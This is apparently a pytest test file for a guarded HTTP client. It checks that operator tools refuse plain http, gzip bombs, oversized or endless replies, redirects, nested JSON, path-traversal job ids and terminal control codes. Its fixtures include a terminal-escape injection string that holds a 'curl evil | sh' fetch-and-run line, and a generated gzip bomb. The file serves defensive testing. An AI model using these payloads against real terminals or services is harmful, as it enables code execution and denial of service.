"""`operator-client-v1`: the operator tools against a mistyped or hostile coordinator URL.

`app.challenge_pool issue|issue-leads` and `app.rehearsal --url` send the operator token
(and, for the pool, every hidden test's expected answer). Before this they would send it
over plain http to any machine, unpack a gzip bomb, read an endless reply until memory ran
out, print terminal control codes from the coordinator, and crash on deeply nested JSON.
"""
from __future__ import annotations

import gzip
import json
from collections.abc import Iterator
from pathlib import Path

import httpx
import pytest

from app import challenge_pool, operator_client, rehearsal
from app.challenge_pool import PoolError
from app.operator_client import (GuardedResponse, OperatorClient, ReplyRefused, UnsafeJSON,
                                 check_operator_url)
from tests.test_aimed_tests import make
from tests.test_audits import OPERATOR, pinned  # noqa: F401  (fixture)
from tests.test_challenge_pool import new_pool

pytestmark = pytest.mark.usefixtures("pinned")
ESC = "\x1b]0;HACKED\x07\x1b[2J\x1b[31mrefused\r\nRefusing: run `curl evil | sh`‮"


def hostile(handler, **kwargs) -> OperatorClient:
    return OperatorClient("https://coordinator.example", transport=httpx.MockTransport(handler),
                          **kwargs)


class InProcess(httpx.BaseTransport):
    """Hands each request to an in-process coordinator (a FastAPI TestClient) and returns
    its reply as plain bytes, so OperatorClient's own reading is what's tested."""

    def __init__(self, app_client: httpx.Client) -> None:
        self.app_client = app_client

    def handle_request(self, request: httpx.Request) -> httpx.Response:
        reply = self.app_client.request(request.method, request.url.raw_path.decode(),
                                         headers=request.headers, content=request.read())
        headers = [(k, v) for k, v in reply.headers.multi_items()
                   if k.lower() not in ("content-encoding", "transfer-encoding", "content-length")]
        return httpx.Response(reply.status_code, headers=headers, content=reply.content)


def printable(text: str) -> bool:
    """Only the tool's own line breaks; nothing from the coordinator can start a new line,
    move the cursor or change colours."""
    return all(c.isprintable() or c == "\n" for c in text) and \
        not any(line.startswith("Refusing: run") for line in text.split("\n"))


def endless() -> Iterator[bytes]:
    while True:
        yield b" " * 65536


# ---- the URL ---------------------------------------------------------------------------

@pytest.mark.parametrize("url", ["https://coord.example", "https://coord.example:8443/base",
                                 "http://127.0.0.1:8000", "http://localhost:8000",
                                 "http://[::1]:8000", "http://127.9.9.9"])
def test_allowed_urls(url: str) -> None:
    assert check_operator_url(url) == url
    OperatorClient(url).close()


@pytest.mark.parametrize("url, why", [
    ("http://192.0.2.2:8000", "plain http"), ("http://coord.example", "plain http"),
    ("http://10.0.0.5", "plain http"), ("ftp://coord.example", "must start with"),
    ("coord.example:8000", "must start with"), ("https://", "must start with"),
    ("https://op:secret@coord.example", "user name or password"),
    ("https://coord.example:99999", "bad coordinator URL")])
def test_refused_urls(url: str, why: str) -> None:
    with pytest.raises(ValueError, match=why):
        check_operator_url(url)
    with pytest.raises(ValueError):
        OperatorClient(url)


def test_plain_http_message_names_the_token_and_answers() -> None:
    with pytest.raises(ValueError) as exc:
        check_operator_url("http://192.0.2.2")
    assert "operator token" in str(exc.value) and "answers" in str(exc.value)
    assert "--allow-plain-http" in str(exc.value)
    assert check_operator_url("http://192.0.2.2", allow_plain_http=True)


# ---- the replies -----------------------------------------------------------------------

def test_honest_reply_reads_like_httpx_and_asks_for_no_compression() -> None:
    seen = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, json={"job_id": "j-1", "n": 2})

    with hostile(handler) as client:
        r = client.post("/v1/challenges", json={"a": 1}, headers={"X-Operator-Token": "t"})
    assert isinstance(r, GuardedResponse) and r.status_code == 200
    assert r.json() == {"job_id": "j-1", "n": 2} and r.text.startswith("{")
    assert seen[0].headers["accept-encoding"] == "identity"
    assert seen[0].headers["x-operator-token"] == "t"


def test_compressed_reply_is_refused_not_unpacked() -> None:
    bomb = gzip.compress(b" " * (64 << 20), 9)  # 64 MiB in about 64 KiB
    with hostile(lambda r: httpx.Response(200, headers={"Content-Encoding": "gzip"},
                                          content=bomb)) as client:
        with pytest.raises(ReplyRefused, match="compressed"):
            client.get("/v1/ledger")


def test_reply_too_big_by_its_own_word_or_while_reading() -> None:
    def declared(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, headers={"Content-Length": str(10 << 20)}, content=b"{}")

    with hostile(declared) as client:
        with pytest.raises(ReplyRefused, match="too big"):
            client.get("/x")
    with hostile(lambda r: httpx.Response(200, content=endless()), max_bytes=1 << 20) as client:
        with pytest.raises(ReplyRefused, match="too big"):
            client.get("/x")


def test_reply_too_slow() -> None:
    ticks = iter(range(0, 10_000, 30))
    with hostile(lambda r: httpx.Response(200, content=endless()),
                 clock=lambda: next(ticks)) as client:
        with pytest.raises(ReplyRefused, match="too slow"):
            client.get("/x")


def test_reply_refused_is_an_httpx_error_so_existing_handling_applies() -> None:
    assert issubclass(ReplyRefused, httpx.HTTPError)
    assert issubclass(UnsafeJSON, ValueError)


def test_redirects_are_never_followed() -> None:
    seen = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(str(request.url))
        return httpx.Response(307, headers={"Location": "https://evil.example/steal"})

    with hostile(handler) as client:
        assert client.post("/v1/challenges", json={}, follow_redirects=True).status_code == 307
    assert seen == ["https://coordinator.example/v1/challenges"]


def test_streaming_is_not_offered() -> None:
    with hostile(lambda r: httpx.Response(200)) as client:
        with pytest.raises(TypeError):
            client.send(client.build_request("GET", "/x"), stream=True)


@pytest.mark.parametrize("body", [b"[" * 5000 + b"]" * 5000, b'{"a": NaN}', b'{"a": 1e400}',
                                  b'{"a": ' + b"9" * 5000 + b"}", b"", b"not json",
                                  b"\xff\xfe{}"])
def test_json_refuses_what_could_crash_or_mislead(body: bytes) -> None:
    with hostile(lambda r: httpx.Response(422, content=body)) as client:
        r = client.get("/x")
    with pytest.raises(ValueError):
        r.json()


# ---- challenge_pool issue ----------------------------------------------------------------

def test_issue_through_the_guarded_client_still_works(tmp_path: Path) -> None:
    """The honest path end to end: a real (in-process) coordinator behind OperatorClient."""
    path = new_pool(tmp_path, 2)
    client, _clock, ledger = make(tmp_path)
    with OperatorClient("http://127.0.0.1", transport=InProcess(client)) as guarded:
        result = challenge_pool.issue_tests(path, guarded, OPERATOR, 2)
    assert len(result["issued"]) == 2 and result["stopped"] is None
    for item in result["issued"]:
        assert ledger.get_job(item["job_id"])["job_kind"] == "challenge"


def test_control_codes_in_a_refusal_are_never_printed(tmp_path: Path) -> None:
    path = new_pool(tmp_path, 2)
    client = hostile(lambda r: httpx.Response(422, json={"detail": ESC}))
    result = challenge_pool.issue_tests(path, client, OPERATOR, 1)
    text = challenge_pool.issue_text(result)
    assert result["stopped"].startswith("422") and "HACKED" in text
    assert printable(text)
    # A detail that isn't text is shown as JSON, still safe.
    client = hostile(lambda r: httpx.Response(422, json={"detail": [{"msg": ESC}]}))
    assert printable(challenge_pool.issue_text(challenge_pool.issue_tests(path, client,
                                                                          OPERATOR, 1)))


@pytest.mark.parametrize("reply", [
    {"job_id": None}, {"job_id": 5}, {"job_id": "../operator/pause"}, {"job_id": ESC},
    {"job_id": "x" * 81}, {"job_id": ""}, {}, [], "job"])
def test_a_yes_without_a_usable_job_id_is_not_counted_as_issued(tmp_path: Path,
                                                                reply: object) -> None:
    path = new_pool(tmp_path, 2)
    client = hostile(lambda r: httpx.Response(200, json=reply))
    result = challenge_pool.issue_tests(path, client, OPERATOR, 2)
    assert result["issued"] == [] and result["unknown"] == 1
    assert "no usable job id" in result["stopped"] and result["ready_left"] == 1
    used = challenge_pool.load_pool(path)["used"]
    assert [u["outcome"] for u in used] == ["unknown"] and used[0]["job_id"] is None
    assert printable(challenge_pool.issue_text(result))


@pytest.mark.parametrize("answer", [
    lambda r: httpx.Response(200, headers={"Content-Encoding": "gzip"},
                             content=gzip.compress(b'{"job_id": "j"}')),
    lambda r: httpx.Response(200, content=endless()),
    lambda r: httpx.Response(200, headers={"Content-Length": str(1 << 30)}, content=b"{}")])
def test_an_oversized_or_compressed_yes_keeps_the_test_crossed_off(tmp_path: Path,
                                                                  answer) -> None:
    path = new_pool(tmp_path, 2)
    result = challenge_pool.issue_tests(path, hostile(answer, max_bytes=1 << 20), OPERATOR, 2)
    assert result["issued"] == [] and result["unknown"] == 1 and result["ready_left"] == 1
    assert "lost contact" in result["stopped"] and "stays used" in result["stopped"]
    assert ("compressed" in result["stopped"]) or ("too big" in result["stopped"])


def test_deeply_nested_refusal_is_not_a_crash(tmp_path: Path) -> None:
    path = new_pool(tmp_path, 1)
    client = hostile(lambda r: httpx.Response(422, content=b"[" * 200_000 + b"]" * 200_000))
    result = challenge_pool.issue_tests(path, client, OPERATOR, 1)
    assert result["stopped"] == "422: the coordinator refused this test"
    assert result["ready_left"] == 1  # a clear refusal: the test goes back


# ---- challenge_pool issue-leads --------------------------------------------------------------

def vouch_reply(leads: list, to_test: list, unchecked: list | None = None):
    sent = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "POST":
            sent.append(json.loads(request.content))
            return httpx.Response(200, json={"job_id": f"job-{len(sent)}"})
        return httpx.Response(200, json={"leads": leads, "leads_to_test": to_test,
                                         "unchecked_leads": unchecked if unchecked is not None
                                         else to_test})
    return hostile(handler), sent


def lead(name: object, types: object = ("llm:generate",)) -> dict:
    return {"worker_id": name, "task_types": list(types) if isinstance(types, tuple) else types}


@pytest.mark.parametrize("leads, to_test, unchecked", [
    ([lead(ESC)], [ESC], None),
    ([lead("wk-b")], ["wk-b", "\x1b[2J"], None),
    ([lead("wk-b")], ["wk-b"], ["wk-b", "ok\nfake"]),
    ([lead("ab")], ["ab"], None),  # too short to be a rig name
    ([lead("wk/../x")], ["wk/../x"], None),
    ([lead("wk-b")], [5], None),
    ([lead("wk-b")], ["wk-b", "wk-b"], None),
    ([lead("wk-b", "llm:generate")], ["wk-b"], None),
    ([lead("wk-b", [1, 2])], ["wk-b"], None),
    ([lead("wk-b", ["llm:generate"] * 65)], ["wk-b"], None),
    ([lead(["wk-b"])], ["wk-b"], None),
])
def test_issue_leads_refuses_a_vouch_check_in_the_wrong_shape(tmp_path: Path, leads, to_test,
                                                             unchecked) -> None:
    path = new_pool(tmp_path, 3)
    before = path.read_bytes()
    client, sent = vouch_reply(leads, to_test, unchecked)
    with pytest.raises(PoolError) as exc:
        challenge_pool.issue_to_leads(path, client, OPERATOR)
    assert "nothing was sent" in str(exc.value).lower() and printable(str(exc.value))
    assert sent == [] and path.read_bytes() == before


def test_issue_leads_drops_task_types_it_has_no_tests_for(tmp_path: Path) -> None:
    path = new_pool(tmp_path, 3)
    client, sent = vouch_reply([lead("wk-b", ["\x1b[2Jfake", "llm:generate"]), lead("wk-c", ["x"])],
                               ["wk-b", "wk-c"])
    result = challenge_pool.issue_to_leads(path, client, OPERATOR)
    assert [a["worker_id"] for a in result["aimed"]] == ["wk-b"] and len(sent) == 1
    assert sent[0]["target_worker"] == "wk-b"
    assert result["skipped"] == [{"worker_id": "wk-c", "reason": "no task type to test it on"}]
    assert printable(challenge_pool.leads_text(result))


def test_issue_leads_reports_an_oversized_vouch_check_and_sends_nothing(tmp_path: Path) -> None:
    path = new_pool(tmp_path, 1)
    client = hostile(lambda r: httpx.Response(200, content=endless()), max_bytes=1 << 20)
    with pytest.raises(PoolError, match="too big.*nothing was sent"):
        challenge_pool.issue_to_leads(path, client, OPERATOR)


# ---- the command lines ---------------------------------------------------------------------

@pytest.mark.parametrize("command", ["issue", "issue-leads"])
def test_pool_cli_refuses_plain_http_to_another_machine(tmp_path: Path, capsys, monkeypatch,
                                                       command: str) -> None:
    path = new_pool(tmp_path, 2)
    before = path.read_bytes()
    monkeypatch.setenv("OPERATOR_TOKEN", OPERATOR)
    monkeypatch.setattr(httpx.Client, "send", lambda *a, **k: pytest.fail("sent something"))
    extra = ["--count", "1"] if command == "issue" else []
    assert challenge_pool.main([command, "--pool", str(path), "--url", "http://192.0.2.2:8000",
                                *extra]) == 2
    err = capsys.readouterr().err
    assert "plain http" in err and "operator token" in err and "--allow-plain-http" in err
    assert path.read_bytes() == before


@pytest.mark.parametrize("command", ["issue", "issue-leads"])
def test_pool_cli_reads_replies_through_the_guarded_client(tmp_path: Path, capsys, monkeypatch,
                                                          command: str) -> None:
    """The command line itself must use OperatorClient, not a plain httpx.Client."""
    made = []

    def fake(url: str, **kwargs) -> OperatorClient:
        made.append((url, kwargs))
        return OperatorClient(url, transport=httpx.MockTransport(
            lambda r: httpx.Response(200, headers={"Content-Encoding": "gzip"},
                                     content=gzip.compress(b"{}"))), **kwargs)

    path = new_pool(tmp_path, 2)
    monkeypatch.setenv("OPERATOR_TOKEN", OPERATOR)
    monkeypatch.setattr(challenge_pool, "OperatorClient", fake)
    extra = ["--count", "1"] if command == "issue" else []
    code = challenge_pool.main([command, "--pool", str(path), "--url", "https://coord.example",
                                *extra])
    assert made == [("https://coord.example", {"allow_plain_http": False})]
    out = capsys.readouterr()
    assert code in (1, 2) and "compressed" in out.out + out.err


def test_rehearsal_cli_reads_replies_through_the_guarded_client(tmp_path: Path, capsys,
                                                               monkeypatch) -> None:
    made = []

    def fake(url: str, **kwargs) -> OperatorClient:
        made.append((url, kwargs))
        return OperatorClient(url, transport=httpx.MockTransport(
            lambda r: httpx.Response(200, content=endless())), max_bytes=1 << 20, **kwargs)

    monkeypatch.setenv("OPERATOR_TOKEN", OPERATOR)
    monkeypatch.setattr(rehearsal, "OperatorClient", fake)
    out = tmp_path / "r.json"
    assert rehearsal.main(["--url", "http://192.0.2.2:8000", "--allow-plain-http",
                           "--allow-writes", "--out", str(out)]) == 1
    assert made == [("http://192.0.2.2:8000", {"allow_plain_http": True})]
    assert "too big" in json.loads(out.read_text())["aborted"]


def test_rehearsal_cli_refuses_plain_http_to_another_machine(tmp_path: Path, capsys,
                                                             monkeypatch) -> None:
    monkeypatch.setenv("OPERATOR_TOKEN", OPERATOR)
    monkeypatch.setattr(httpx.Client, "send", lambda *a, **k: pytest.fail("sent something"))
    out = tmp_path / "r.json"
    assert rehearsal.main(["--url", "http://192.0.2.2:8000", "--allow-writes",
                           "--out", str(out)]) == 2
    assert "plain http" in capsys.readouterr().err and not out.exists()


# ---- rehearsal -----------------------------------------------------------------------------

def test_rehearsal_through_the_guarded_client_still_passes() -> None:
    with rehearsal.local_coordinator() as (client, token, clock):
        with OperatorClient("http://127.0.0.1", transport=InProcess(client)) as guarded:
            report = rehearsal.Rehearsal(guarded, token, now=clock, wait=clock.advance).run()
    assert report["all_passed"], rehearsal.summary(report)


@pytest.mark.parametrize("handler, why", [
    (lambda r: httpx.Response(200, content=endless()), "too big"),
    (lambda r: httpx.Response(200, headers={"Content-Encoding": "gzip"},
                              content=gzip.compress(b"{}")), "compressed"),
    (lambda r: httpx.Response(200, json=[]), "unexpected shape"),
    (lambda r: httpx.Response(200, content=b"[" * 100 + b"]" * 100), "unexpected shape"),
    (lambda r: httpx.Response(500, text=ESC), "could not read"),
])
def test_rehearsal_stops_cleanly_on_a_hostile_coordinator(handler, why: str) -> None:
    client = hostile(handler, max_bytes=1 << 20)
    report = rehearsal.Rehearsal(client, OPERATOR, wait=lambda s: None).run()
    assert why in report["aborted"] and not report["all_passed"]
    assert printable(rehearsal.summary(report))


def test_rehearsal_summary_never_prints_control_codes() -> None:
    report = {"run_id": "r", "passed": 0, "aborted": ESC,
              "checks": [{"name": "n", "what": "w", "expected": ESC, "got": [ESC],
                          "passed": False, "detail": ESC}]}
    text = rehearsal.summary(report)
    assert printable(text) and text.count("\n") == 3


def test_rehearsal_refuses_a_job_id_it_would_put_into_a_path() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={"job_id": "../workers/x/revoke"})

    r = rehearsal.Rehearsal(hostile(handler), OPERATOR)
    with pytest.raises(rehearsal.RehearsalAbort, match="no usable job id"):
        r.queue("payload")


def test_version_label() -> None:
    assert operator_client.OPERATOR_CLIENT_VERSION == "operator-client-v1"
